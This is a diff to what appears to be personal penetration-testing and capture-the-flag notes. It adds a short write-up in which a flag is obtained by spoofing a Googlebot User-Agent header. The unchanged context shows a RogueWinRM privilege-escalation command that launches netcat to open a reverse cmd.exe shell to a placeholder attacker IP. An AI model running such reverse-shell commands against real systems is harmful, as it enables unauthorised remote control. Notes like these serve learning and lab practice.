@@ -671,3 +671,15 @@ These privileges allow a process to impersonate other users and act on their beh
 Use RogueWinRM 
 
     c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
+
+
+# The black side writeup
+## Google Bot Center
+User-Agent is the key to the flag
+
+    Host: www.example.com
+    Connection: keep-alive
+    Accept: text/plain,text/html,*/*
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+    Accept-Encoding: gzip,deflate,br
+
